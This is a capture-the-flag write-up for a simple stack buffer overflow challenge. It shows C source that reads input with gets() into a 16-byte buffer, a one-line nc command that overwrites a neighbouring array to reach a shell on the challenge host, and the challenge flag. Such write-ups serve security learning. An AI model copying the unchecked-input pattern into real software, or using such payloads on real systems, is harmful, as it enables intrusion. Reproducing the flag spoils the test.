# Overflow 1

![Binary Exploitation](https://img.shields.io/badge/Binary%20Exploitation--00aaff?style=for-the-badge) ![Points - 125](https://img.shields.io/badge/Points-125-9cf?style=for-the-badge)

```txt
ez overflow.

nc cyberyoddha.baycyber.net 10001

- Haskell#1426
```

---

Ok... in the source code you can see that an array `str` is defined near the beginning of the `main` function and that, in case it's content is not `"AAAA"` in the end, a shell will be opened:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  char str[] = "AAAA";
  char buf[16];

  gets(buf);
  
  if (!(str[0] == 'A' && str[1] == 'A' && str[2] == 'A' && str[3] == 'A')){
    system("/bin/sh");
  }
}
```

This is, as the task description says, still an `ez` challenge ^^. In `radare`, you can see that the `str` array is right after `buf` on the stack...

![r2](./r2.png)

... so... simply pass a string that's longer than `16` characters, but also not too long ^^ you don't necessarily want to overwrite any other stack values, to the programs `stdin` (no exploit script needed for this one):

```bash
(python -c "print('B'*20)";cat) | nc cyberyoddha.baycyber.net 10001
```

... now that you have a shell, use it to `cat` the flag: `CYCTF{st@ck_0v3rfl0ws_@r3_3z}`
